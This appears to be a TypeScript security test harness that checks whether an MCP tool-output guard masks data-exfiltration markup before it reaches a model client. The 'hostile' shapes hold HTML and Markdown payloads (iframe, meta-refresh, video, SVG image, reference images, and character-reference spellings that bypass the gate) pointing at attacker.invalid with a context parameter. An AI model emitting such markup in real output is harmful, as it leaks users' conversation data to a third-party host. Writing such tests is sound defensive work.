// T66 — the boundaries, for THIS review's classes.
//
// Two questions the T46 measurement did not ask:
//   1. Are the newly covered surfaces closed at the tool dispatch AND the
//      persistence materializer (not only in the detector)?
//   2. Do the spellings this review found — the two gates read WITHOUT
//      character-reference decoding, and the CommonMark reference-image
//      spellings the enumeration's "already covered" row claims — reach a model
//      client unmasked, with `redaction.state:"none"` affirmatively saying
//      nothing was redacted?
//
// Plus the false-positive side of the covered decision: realistic benign
// documents (a docs page embedding a player, a README embedding a demo, quoted
// JSX components) that the widened element set now flags.
//
// Advisory redaction is OFF (`mergeMcpConfig({ redactToolOutput: false })`), so
// what is measured is the MANDATORY floor. Read-only, synthetic hosts only.
//
// Usage: bun T66-boundary.ts [out.json]
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const CDN = "cdn.example.org";

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

type Shape = { text: string; kind: "hostile" | "benign"; why: string };

const shapes: Record<string, Shape> = {
  // ---- newly covered surfaces: must be closed at every boundary -------------
  covInputImage: { text: `<input type=image src="${U}">`, kind: "hostile", why: "U01" },
  covMetaRefresh: { text: `<meta http-equiv="refresh" content="0;url=${U}">`, kind: "hostile", why: "U02" },
  covVideoPoster: { text: `<video poster="${U}"></video>`, kind: "hostile", why: "U03" },
  covVideoSrc: { text: `<video src="${U}"></video>`, kind: "hostile", why: "U04" },
  covAudioSrc: { text: `<audio src="${U}"></audio>`, kind: "hostile", why: "U05" },
  covSourceSrc: { text: `<video><source src="${U}"></video>`, kind: "hostile", why: "U06" },
  covSourceSrcset: { text: `<picture><source srcset="${U} 2x"></picture>`, kind: "hostile", why: "U07" },
  covTrackSrc: { text: `<video><track default src="${U}"></video>`, kind: "hostile", why: "U08" },
  covEmbedSrc: { text: `<embed src="${U}">`, kind: "hostile", why: "U09" },
  covObjectData: { text: `<object data="${U}"></object>`, kind: "hostile", why: "U10" },
  covIframeSrc: { text: `<iframe src="${U}"></iframe>`, kind: "hostile", why: "U11" },
  covBodyBackground: { text: `<body background="${U}">`, kind: "hostile", why: "U16" },
  covTdBackground: { text: `<td background="${U}">x</td>`, kind: "hostile", why: "U16" },
  covSvgImageHref: { text: `<svg><image href="${U}"/></svg>`, kind: "hostile", why: "U23" },
  covFeImageHref: { text: `<svg><filter><feImage href="${U}"/></filter></svg>`, kind: "hostile", why: "U24" },

  // ---- THIS review's spellings: gates read without decoding -----------------
  bypMetaRefreshCharref: {
    text: `<meta http-equiv="&#114;efresh" content="0;url=${U}">`,
    kind: "hostile",
    why: "http-equiv is decoded by the tokenizer, so this IS refresh",
  },
  bypMetaRefreshHexCharref: {
    text: `<meta http-equiv="&#x72;efresh" content="0;url=${U}">`,
    kind: "hostile",
    why: "hex spelling of the same gate",
  },
  bypInputTypeCharref: {
    text: `<input type="&#105;mage" src="${U}">`,
    kind: "hostile",
    why: "type is decoded by the tokenizer, so this IS image",
  },
  bypInputTypeTrailingCharref: {
    text: `<input type="imag&#101;" src="${U}">`,
    kind: "hostile",
    why: "same gate, reference at the end",
  },

  // ---- THIS review's spellings: CommonMark reference images -----------------
  bypCollapsedRefImage: { text: `![a][]\n\n[a]: ${U}\n`, kind: "hostile", why: "collapsed reference image" },
  bypShortcutRefImage: { text: `![a]\n\n[a]: ${U}\n`, kind: "hostile", why: "shortcut reference image" },
  bypNestedBracketAlt: { text: `![a[b]c](${U})`, kind: "hostile", why: "balanced brackets in the description" },

  // ---- controls that must stay closed (the covered baseline) ---------------
  ctlFullRefImage: { text: `![a][a]\n\n[a]: ${U}\n`, kind: "hostile", why: "full reference image, covered" },
  ctlImgSrc: { text: `<img src="${U}">`, kind: "hostile", why: "baseline" },

  // ---- benign documents the widened set now flags --------------------------
  fpDocsIframePlayer: {
    text: `# Getting started\n\nWatch the walkthrough:\n\n<iframe src="https://player.${CDN}/embed/abc" width="640" height="360" allowfullscreen></iframe>\n\nThen run \`keryx init\`.\n`,
    kind: "benign",
    why: "documentation page embedding a player (T46 §6.1)",
  },
  fpReadmeVideo: {
    text: `## Demo\n\n<video src="https://${CDN}/demo.mp4" poster="https://${CDN}/demo.png" controls></video>\n`,
    kind: "benign",
    why: "README embedding a demo",
  },
  fpQuotedJsxComponents: {
    text: `export function Player() {\n  return (\n    <Video src="https://${CDN}/intro.mp4" poster="https://${CDN}/intro.png" />\n  );\n}\n`,
    kind: "benign",
    why: "quoted TSX with capitalised components (T46 §6.4)",
  },
  fpQuotedJsxIframe: {
    text: `<Iframe src="https://player.${CDN}/embed/abc" title="demo" />`,
    kind: "benign",
    why: "quoted TSX iframe component",
  },
  fpMdxEmbed: {
    text: `import { Callout } from "./ui";\n\n<Embed src="https://${CDN}/board/1" />\n`,
    kind: "benign",
    why: "MDX embed component",
  },
  fpRelativeOnlyPage: {
    text: `<video src="/media/demo.mp4" poster="/media/demo.png"></video><iframe src="./embed.html"></iframe>`,
    kind: "benign",
    why: "same-origin page — must stay released",
  },
  fpPublicLink: {
    text: "[public documentation](https://docs.example.org/guide)",
    kind: "benign",
    why: "AC5: a public markdown link is not a network send",
  },
  fpAllowlistedIframe: {
    text: `<iframe src="https://player.${CDN}/embed/abc"></iframe>`,
    kind: "benign",
    why: "same shape as fpDocsIframePlayer, used for the allowlist check below",
  },
};

const cwd = process.cwd();

const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }), // advisory OFF
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, shape]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: shape.text }),
  })),
};

type Result = {
  id: string;
  kind: string;
  detectorFindings: number;
  mcpState: string;
  mcpIsError: boolean;
  mcpLeaksHost: boolean;
  persistLeaksHost: boolean;
  persistByteIdentical: boolean;
  transportLeaksHost: boolean;
  transportState: string;
  seamLeaksHost: boolean;
  why: string;
};

const results: Result[] = [];
for (const [name, shape] of Object.entries(shapes)) {
  const host = shape.kind === "hostile" ? ATT : CDN;
  const serialized = JSON.stringify({ note: shape.text });

  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({
    value: { note: shape.text },
    format: "json",
  });
  const seamText = await redactToolOutput(cwd, serialized);

  results.push({
    id: name,
    kind: shape.kind,
    detectorFindings: detectExfil(shape.text, []).length,
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    mcpIsError: call.isError === true,
    mcpLeaksHost: JSON.stringify(call).includes(host),
    persistLeaksHost: persisted.allowed ? persisted.content.includes(host) : false,
    persistByteIdentical: persisted.allowed ? persisted.content === serialized : false,
    transportLeaksHost: transported.text.includes(host),
    transportState: transported.redaction.state,
    seamLeaksHost: seamText.includes(host),
    why: shape.why,
  });
}

for (const r of results) {
  console.log(
    `${r.id.padEnd(26)} ${r.kind.padEnd(8)} n=${String(r.detectorFindings).padEnd(2)} mcp[state=${r.mcpState} err=${r.mcpIsError} leak=${r.mcpLeaksHost}] persist[leak=${r.persistLeaksHost} identical=${r.persistByteIdentical}] transport[state=${r.transportState} leak=${r.transportLeaksHost}] seam[leak=${r.seamLeaksHost}]`,
  );
}

// The allowlist remedy, on the row T46 says is the one to push back on.
const allowlisted = detectExfil(shapes.fpAllowlistedIframe!.text, [`player.${CDN}`]);
const notAllowlisted = detectExfil(shapes.fpAllowlistedIframe!.text, []);

const hostileLeaking = results.filter(
  (r) =>
    r.kind === "hostile" &&
    (r.mcpLeaksHost || r.persistLeaksHost || r.transportLeaksHost || r.seamLeaksHost),
);
const summary = {
  shapes: results.length,
  hostileLeakingAtAnyBoundary: hostileLeaking.map((r) => r.id),
  hostileLeakingCount: hostileLeaking.length,
  hostileFullyClosed: results.filter(
    (r) =>
      r.kind === "hostile" &&
      !r.mcpLeaksHost &&
      !r.persistLeaksHost &&
      !r.transportLeaksHost &&
      !r.seamLeaksHost,
  ).length,
  // a leaking row whose metadata affirmatively says nothing was redacted
  leakingWithStateNone: hostileLeaking.filter((r) => r.mcpState === "none").map((r) => r.id),
  benignNewlyFlagged: results
    .filter((r) => r.kind === "benign" && r.mcpState !== "none")
    .map((r) => `${r.id}(n=${r.detectorFindings})`),
  benignUntouched: results
    .filter((r) => r.kind === "benign" && r.mcpState === "none")
    .map((r) => r.id),
  allowlistRemedyWorksOnIframe: notAllowlisted.length > 0 && allowlisted.length === 0,
};
console.log(JSON.stringify(summary, null, 2));

const dest = process.argv[2];
if (dest) await Bun.write(dest, JSON.stringify({ summary, results }, null, 2));
